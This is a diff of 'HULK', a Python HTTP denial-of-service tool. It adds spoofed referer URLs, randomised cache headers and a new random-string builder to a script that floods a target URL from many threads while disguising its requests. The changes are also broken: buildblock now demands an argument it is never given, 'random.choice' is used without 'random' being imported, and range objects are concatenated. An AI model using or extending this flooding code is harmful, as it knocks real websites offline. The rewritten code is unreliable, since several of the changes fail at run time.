@@ -6,16 +6,11 @@
 # its is meant for research purposes only and
 # any malicious usage of this tool is prohibited.
 #
-# authors :  Barry Shteiman, Maxim Muzafarov , version 1.2
+# authors :  Barry Shteiman, Maxim Muzafarov , version 1.3
 # ----------------------------------------------------------------------------
-import sys
-import requests
-from requests.exceptions import HTTPError, ConnectionError
-
-from random import randint, choice
-from re import search
-from string import ascii_lowercase as alphabet
-from threading import Thread
+import sys, requests; from requests.exceptions import HTTPError, ConnectionError
+from random import randint, choice; from re import search
+from string import ascii_lowercase as alphabet; from threading import Thread
 
 # global params
 url = ''
@@ -135,6 +130,9 @@ useragents = [
 
 referers = [
     'http://www.google.com/?q=',
+    'http://www.google.co.uk/?q=',
+    'http://www.google.ru/?q=',
+    'http://www.youtube.com/?q=',
     'http://www.usatoday.com/search/results?q=',
     'http://engadget.search.aol.com/search?q=',
     'http://yandex.ru/yandsearch?text=',
@@ -146,26 +144,29 @@ request_counter = 0
 flag = 0
 safe = False
 
-
 def inc_counter():
     global request_counter
     request_counter += 1
-
 
 def set_flag(val):
     global flag
     flag = val
 
-
 def set_safe():
     global safe
     safe = True
 
-
 # builds random ascii string
-def buildblock():
-    return ''.join(choice(alphabet) for _ in range(randint(3, 10)))
-
+def buildblock(size):
+    out_str=''
+    _LOWERCASE = range(97,122)
+    _UPPERCASE = range(65,90)
+    _NUMERIC = range(48,57)
+    validChars = _LOWERCASE + _UPPERCASE + _NUMERIC
+    for i in range(0, size):
+        a = choice(validChars)
+        out_str += chr(a)
+    return(out_str)
 
 def usage():
     print('---------------------------------------------------')
@@ -173,7 +174,6 @@ def usage():
     print('you can add "safe" after url, to autoshut after dos')
     print('---------------------------------------------------')
     sys.exit()
-
 
 # http request
 def httpcall(url):
@@ -184,8 +184,8 @@ def httpcall(url):
             params={buildblock(): buildblock()},
             headers={
                 'User-Agent': choice(useragents),
-                'Cache-Control': 'no-cache',
-                'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
+                'Cache-Control': random.choice(['no-cache','max-age=0']),
+                'Accept-Charset': 'ISO-8859-1,UTF-8;q=0.7,*;q=0.7',
                 'Referer': choice(referers) + buildblock(),
                 'Keep-Alive': randint(110, 120)}
         )
@@ -204,13 +204,12 @@ def httpcall(url):
             params={buildblock(): buildblock()},
             headers={
                 'User-Agent': choice(useragents),
-                'Cache-Control': 'no-cache',
-                'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
+                'Cache-Control': random.choice(['no-cache','max-age=0']),
+                'Accept-Charset': 'ISO-8859-1,UTF-8;q=0.7,*;q=0.7',
                 'Referer': choice(referers) + buildblock(),
                 'Keep-Alive': randint(110, 120)}
         )
     return (code)
-
 
 # http caller thread
 class HTTPThread(Thread):
@@ -223,7 +222,6 @@ class HTTPThread(Thread):
         except Exception as ex:
             pass
 
-
 # monitors http threads and counts requests
 class MonitorThread(Thread):
     def run(self):
@@ -234,7 +232,6 @@ class MonitorThread(Thread):
                 prev = request_counter
         if flag > 1:
             print("\n-- HULK Attack Finished --")
-
 
 if __name__ == "__main__":
     # execute
